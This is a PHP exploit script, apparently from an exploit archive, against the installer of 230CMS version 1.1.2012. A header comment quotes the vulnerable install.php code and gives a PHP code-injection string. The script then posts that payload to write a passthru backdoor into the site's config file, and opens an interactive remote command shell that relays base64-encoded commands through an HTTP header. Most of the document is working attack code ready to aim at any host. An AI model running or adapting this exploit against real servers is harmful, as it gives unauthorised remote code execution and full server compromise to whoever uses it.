<?php
/*
  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /        
  / XXXXXX /
 (________(          
  `------'
  
 Exploit Title   : 230CMS Remote Code Execution Exploit
 Date            : 12 June 2013
 Exploit Author  : CWH Underground
 Discovered By   : ZeQ3uL
 Site            : www.2600.in.th
 Vendor Homepage : http://230cms.blogspot.com/
 Software Link   : http://jaist.dl.sourceforge.net/project/cms230/230%20CMS%201.1.2012/230%20CMS%201.1.2012.zip
 Version         : 1.1.2012
 Tested on       : Window and Linux
  
  
#####################################################
VULNERABILITY: PHP Code Injection
#####################################################
  
/install.php (LINE: 135-161)
 
-----------------------------------------------------------------------------
function SaveSettings () {
global $_POST;
 
if(isset($_POST['save_settings']))
{
 
        echo 'The config file has been written ......<br />';
        $default_time = isset($_POST['default_time']) ? $_POST['default_time'] : 'UTC';
        $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
        $db_name = isset($_POST['db_name']) ? $_POST['db_name'] : '';
        $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : 'root';
        $db_password = isset($_POST['db_password']) ? $_POST['db_password'] : '';
        $db_prefix = isset($_POST['db_prefix']) ? $_POST['db_prefix'] : '230_';
        $ad_name = isset($_POST['ad_name']) ? $_POST['ad_name'] : '';
        $ad_username = isset($_POST['ad_username']) ? $_POST['ad_username'] : 'admin';
        $ad_email = isset($_POST['ad_email']) ? $_POST['ad_email'] : '';
        $domain = isset($_POST['domain']) ? $_POST['domain'] : '';
        $sitename = isset($_POST['sitename']) ? $_POST['sitename'] : '230 CMS';
        $tagline = isset($_POST['tagline']) ? $_POST['tagline'] : 'A different CMS';
        $home_articles = isset($_POST['home_articles']) ? $_POST['home_articles'] : '5';
        $twitter = isset($_POST['twitter']) ? $_POST['twitter'] : 'http://twitter.com/username';
        $facebook = isset($_POST['facebook']) ? $_POST['facebook'] : 'http://www.facebook.com';
        $linkedin = isset($_POST['linkedin']) ? $_POST['linkedin'] : 'http://www.linkedin.com';
        $youtube = isset($_POST['youtube']) ? $_POST['youtube'] : 'http://www.youtube.com';
        $flickr = isset($_POST['flickr']) ? $_POST['flickr'] : 'http://www.flickr.com';
         
        $fh = fopen("include/settings/base.php", 'w+') or die("Could not create the config file. Please check the file permissions to the cms installation folder.");
-----------------------------------------------------------------------------
  
LINE: 162-216
Write content to /include/settings/base.php
 
#####################################################
DESCRIPTION
#####################################################
  
An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability.
User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file.
An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.
 
Attacker could access installation page (install.php) and enters the following code: ');passthru(base64_decode($_SERVER[HTTP_CMD]));//
 
#####################################################
EXPLOIT
#####################################################
  
*/
   
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
 
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
  
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
 
print "\n+------------------------------------+";
print "\n| 230CMS PHP Code Injection Exploit |";
print "\n+------------------------------------+\n";
  
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /230cms\n";
    die();
}
 
$host = $argv[1];
$path = $argv[2];
 
$payload  = "default_time=UTC&db_host=localhost&db_name=cwh&db_user=root&db_password=cwh&db_prefix=230_&ad_name=Admin&ad_username=admin&ad_email=admin@this-site.com&domain=www.what-is-my-site-domain.me');error_reporting(0);+print(___);+passthru(base64_decode(\$_SERVER[HTTP_CMD]));//&sitename=230+CMS&tagline=A+different+CMS&home_articles=5&twitter=http://twitter.com/username&facebook=http://www.facebook.com&linkedin=http://www.linkedin.com&youtube=http://www.youtube.com&flickr=http://www.flickr.com&save_settings=Save+Settings\r\n";
 
$packet  = "POST {$path}/install.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Referer: {$host}{$path}/install.php?install=Next\r\n";
$packet .= "Connection: close\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n\r\n{$payload}";
 
$packet .= $payload;
     
http_send($host, $packet);
 
$packet  = "GET /{$path}/index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
     
while(1)
{
    print "\n230cms-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}
      
################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
?>
